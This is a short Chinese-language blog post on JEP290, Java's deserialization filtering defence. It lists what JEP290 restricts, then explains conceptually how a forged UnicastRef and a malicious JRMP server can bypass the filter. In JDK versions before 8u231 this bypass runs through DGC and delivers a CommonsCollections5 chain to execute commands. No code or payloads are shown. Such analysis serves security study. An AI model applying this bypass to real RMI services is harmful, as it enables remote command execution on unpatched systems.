JEP290调试分析

发表于 2026-08-07 更新于 2026-08-10

JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事：

1、提供一个限制反序列化类的机制，使用白名单或者黑名单。
2、限制反序列化的深度和复杂度。
3、为 RMI 远程调用对象提供了一个验证类的机制。
4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。

官方从 8u121，7u13，6u141 分别支持了这个 JEP

0x02 JEP290 绕过

JRMP 的这一步，能够绕过，伪造了一个 UnicastRef (封装了与远程对象通信所需的全部信息和方法)用于跟注册中心通信

早期的JEP290防护主要针对的是RMI注册表本身这个入口。但当注册表作为客户端与JRMP服务端建立连接后，后续的通信（特别是DGC - 分布式垃圾回收环节）在JDK 8u231之前的版本中，反序列化过滤器的设置存在漏洞或未被完全覆盖，因此，恶意JRMP服务端在DGC交互过程中，向注册表（此时它是客户端）发送封装了CommonsCollections5链的序列化数据时，这次反序列化操作不再受到严格的白名单限制，从而成功触发命令执行
